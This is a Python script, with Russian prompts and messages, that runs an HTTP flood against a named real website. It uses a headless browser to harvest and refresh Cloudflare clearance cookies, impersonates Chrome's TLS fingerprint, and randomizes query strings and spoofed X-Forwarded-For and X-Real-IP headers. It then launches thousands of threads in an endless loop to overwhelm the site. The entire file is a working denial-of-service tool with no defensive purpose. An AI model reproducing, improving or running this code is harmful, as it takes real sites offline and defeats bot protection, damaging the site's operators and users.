import asyncio
import threading
import time
import random
import string
import os
from curl_cffi import requests
import nodriver as uc

TARGET = "https://www.naturall-effekt.com/"
THREADS = int(input("Количество потоков (500-2000): "))
REFRESH_INTERVAL = 30  

cf_clearance = None
session = None
last_refresh = 0

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def get_cf_cookie():
    print("[*] Запуск nodriver для получения cf_clearance")
    try:
        browser = await uc.start(headless=True)
        page = await browser.get(TARGET)
        await page.sleep(8)
        
        cookies = await browser.cookies.all()
        await browser.stop()
        
        for c in cookies:
            if c.name == "cf_clearance":
                print(f"[+] cf_clearance получен: {c.value[:20]}...")
                return c.value
        print("[!] cf_clearance не найден, пробую ещё раз...")
        return None
    except Exception as e:
        print(f"[-] Ошибка nodriver: {e}")
        return None

def init_session():
    global session, cf_clearance
    if cf_clearance:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cookie": f"cf_clearance={cf_clearance}"
        })
        return True
    return False

def refresh_cookie():
    global cf_clearance, last_refresh
    print("[*] Обновление cf_clearance...")
    new_cf = asyncio.run(get_cf_cookie())
    if new_cf:
        cf_clearance = new_cf
        last_refresh = time.time()
        init_session()
        print("[+] cf_clearance обновлён")
        return True
    print("[-] Не удалось обновить cf_clearance")
    return False

def attack():
    global session, cf_clearance, last_refresh
    
    if time.time() - last_refresh > REFRESH_INTERVAL:
        refresh_cookie()
    
    if not session:
        return
    
    params = {
        "_": random.randint(100000, 999999),
        "t": str(time.time_ns()),
        random_string(6): random_string(12),
        random_string(6): random_string(12)
    }
    
    headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Referer": f"{TARGET}/?{random_string(8)}={random_string(8)}"
    }
    
    try:
        r = session.get(
            TARGET,
            params=params,
            headers=headers,
            impersonate="chrome120",
            timeout=5
        )
        print(f"[+] {r.status_code} | {r.elapsed.total_seconds():.2f}с")
    except Exception as e:
        print(f"[-] Сброс")

print(f"[*] Цель: {TARGET}")
print(f"[*] Потоков: {THREADS}")
print("[*] Получение начальной cf_clearance...")

cf_clearance = asyncio.run(get_cf_cookie())
if cf_clearance:
    last_refresh = time.time()
    init_session()
    print("[+] Готов к атаке")
    
    while True:
        for _ in range(THREADS):
            threading.Thread(target=attack, daemon=True).start()
        time.sleep(0.001)
else:
    print("[!] Не удалось получить cf_clearance. Проверь цель и интернет.")
